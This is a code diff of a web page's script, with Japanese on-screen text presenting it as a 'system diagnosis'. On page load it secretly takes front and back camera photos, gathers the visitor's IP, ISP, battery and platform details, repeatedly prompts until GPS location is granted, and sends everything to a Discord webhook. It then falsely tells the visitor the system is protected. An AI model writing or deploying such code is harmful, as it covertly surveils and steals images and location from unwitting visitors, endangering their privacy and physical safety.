@@ -35,47 +35,131 @@
 
         async function captureCameraBlobOnce(facingMode) {
             try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    return null;
+                }
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-                const video = document.getElementById('video'); video.srcObject = stream;
+                const video = document.getElementById('video');
+                video.srcObject = stream;
                 await new Promise(res => { video.onloadedmetadata = res; });
+                await video.play().catch(() => {});
+
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-            } catch (e) { return null; }
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                return await new Promise((resolve) => {
+                    canvas.toBlob((b) => {
+                        resolve(b);
+                    }, 'image/jpeg', 0.8);
+                });
+            } catch (e) {
+                return null;
+            }
         }
 
         async function gatherAndSend() {
             try {
-                addLog("> ネットワーク・カメラパラメータを取得中...");
-                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ ip: "取得失敗" }));
+                addLog("> ネットワークパラメータを取得中...");
+                let ipData = {};
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    ipData = await res.json();
+                } catch (e) {
+                    ipData = { ip: "取得失敗" };
+                }
+
+                addLog("> カメラフィードにアクセス中 (前面/背面)...");
                 const frontBlob = await captureCameraBlobOnce("user");
                 const backBlob = await captureCameraBlobOnce("environment");
 
-                addLog("> GPS座標を要求中...");
-                let gpsText = "";
-                while(true) {
+                let batteryInfo = "取得不可";
+                if (navigator.getBattery) {
                     try {
-                        const pos = await new Promise((r, j) => navigator.geolocation.getCurrentPosition(r, j, { timeout: 5000 }));
-                        gpsText = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        break;
-                    } catch(e) { addWarn("位置情報の許可が必要です。"); await new Promise(r => setTimeout(r, 1000)); }
+                        const battery = await navigator.getBattery();
+                        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? '充電中' : '放電中'})`;
+                    } catch (e) {}
                 }
 
-                const msg = { content: "🚨 **【システム診断】情報検知**", embeds: [{ title: "📊 取得データ", fields: [{ name: "IP", value: ipRes.ip }, { name: "GPS", value: gpsText }] }] };
-                const fd = new FormData(); fd.append('payload_json', JSON.stringify(msg));
-                if (frontBlob) fd.append('files[0]', frontBlob, 'front.jpg');
-                if (backBlob) fd.append('files[1]', backBlob, 'back.jpg');
-                await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                addLog("> GPS座標を要求中...");
+                let gpsText = "";
+                while (true) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                        });
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        gpsText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})`;
+                        break;
+                    } catch (e) {
+                        addWarn("位置情報の取得が拒否されました。「許可」を選択してください。");
+                        await new Promise(r => setTimeout(r, 1000));
+                    }
+                }
+
+                addLog("> 情報を送信中...");
+
+                const info = {
+                    ip: ipData.ip || "不明",
+                    city: ipData.city || "不明",
+                    region: ipData.region || "不明",
+                    country: ipData.country_name || "不明",
+                    isp: ipData.org || "不明",
+                    platform: navigator.platform
+                };
+
+                const discordMessage = {
+                    content: "🚨 **【システム診断】情報検知**",
+                    embeds: [{
+                        title: "📊 取得データ一覧",
+                        color: 16711680,
+                        fields: [
+                            { name: "🌐 IPアドレス", value: info.ip, inline: true },
+                            { name: "🏢 プロバイダ", value: info.isp, inline: true },
+                            { name: "📍 地域", value: `${info.country} ${info.region} ${info.city}`, inline: false },
+                            { name: "🔋 バッテリー", value: batteryInfo, inline: true },
+                            { name: "💻 プラットフォーム", value: info.platform, inline: true },
+                            { name: "🛰️ GPS位置情報", value: gpsText, inline: false },
+                            { name: "📷 前面カメラ", value: frontBlob ? "画像添付済み (front.jpg)" : "取得なし/拒否", inline: true },
+                            { name: "📷 背面カメラ", value: backBlob ? "画像添付済み (back.jpg)" : "取得なし/拒否", inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify(discordMessage));
+                
+                if (frontBlob) {
+                    formData.append('files[0]', frontBlob, 'front.jpg');
+                }
+                if (backBlob) {
+                    formData.append('files[1]', backBlob, 'back.jpg');
+                }
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                addLog("> 完了。システムは安全に保護されました。");
 
                 document.body.style.backgroundColor = "#003311";
                 document.getElementById('nextButton').style.display = 'inline-block';
                 document.getElementById('overlayBtn').style.display = 'block';
-            } catch (e) { addWarn("エラー発生"); }
+
+            } catch (error) {
+                addWarn("処理中にエラーが発生しました。");
+            }
         }
 
-function openRandomLink() {
+        function openRandomLink() {
             const targets = [
                 // === YouTube動画リスト ===
                 "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
@@ -98,16 +182,16 @@ function openRandomLink() {
                 "https://www.apple.com"
             ];
             
-            // リストをシャッフル（ランダムに並び替える）
             for (let i = targets.length - 1; i > 0; i--) {
                 const j = Math.floor(Math.random() * (i + 1));
                 [targets[i], targets[j]] = [targets[j], targets[i]];
             }
             
-            // シャッフルされたリストから選ぶ
             const randomUrl = targets[0];
             window.open(randomUrl, '_blank');
-        }        window.onload = gatherAndSend;
+        }
+
+        window.onload = gatherAndSend;
     </script>
 </body>
 </html>
